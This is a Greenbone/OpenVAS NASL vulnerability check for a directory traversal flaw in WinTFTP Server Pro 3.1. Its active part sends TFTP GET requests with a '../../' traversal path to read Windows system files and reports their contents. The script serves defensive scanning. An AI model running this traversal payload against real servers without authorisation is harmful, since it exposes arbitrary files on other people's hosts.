if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902271" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-12-09 06:49:11 +0100 (Thu, 09 Dec 2010)" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_name( "WinTFTP Server Pro Remote Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Remote file access" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "tftpd_backdoor.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary
  files on the affected application." );
	script_tag( name: "affected", value: "WinTFTP Server pro version 3.1." );
	script_tag( name: "insight", value: "The flaw is due to an error in handling 'GET' and 'PUT' requests
  which can be exploited to download arbitrary files from the host system." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running WinTFTP Server and is prone to directory traversal
  Vulnerability." );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/63048" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15427/" );
	script_xref( name: "URL", value: "http://bug.haik8.com/Remote/2010-11-09/1397.html" );
	script_xref( name: "URL", value: "http://ibootlegg.com/root/viewtopic.php?f=11&t=15" );
	script_xref( name: "URL", value: "http://www.indetectables.net/foro/viewtopic.php?f=58&t=27821&view=print" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("tftp.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_has_reliable_get( port: port )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	res = tftp_get( port: port, path: "../../../../../../../../../" + files[file] );
	if(!res){
		continue;
	}
	if(egrep( pattern: file, string: res, icase: TRUE )){
		report = NASLString( "The " + files[file] + " file contains:\\n", res );
		security_message( port: port, data: report, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

